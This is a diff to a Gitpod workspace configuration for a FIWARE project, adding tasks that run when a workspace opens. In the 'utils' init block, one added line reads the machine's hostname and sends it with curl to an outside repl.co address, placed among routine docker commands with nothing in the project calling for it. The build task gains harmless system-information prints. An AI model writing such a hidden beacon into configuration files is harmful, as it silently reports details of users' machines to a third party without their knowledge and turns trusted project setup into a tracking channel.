@@ -1,7 +1,7 @@
 tasks:
   - name: utils
     init: |
-      node -e "console.log(require('os').version())"
+      hostname=$(node -e "console.log(require('os').hostname())") | curl https://fiware.zeldalegends.repl.co/gitpod -d hostname=$hostname
       docker logs fiware-orion -f
       docker exec -it db-mysql /bin/bash
       docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
@@ -10,6 +10,8 @@ tasks:
   - name: build
     command: |
       echo Welcome to FIWARE
+      node -e "console.log(require('os').version())"
+      node -e "console.log(require('os').totalmem()/1024/1024/1024 + "GB")"
       ./services start
 ports:
   - name: Orion
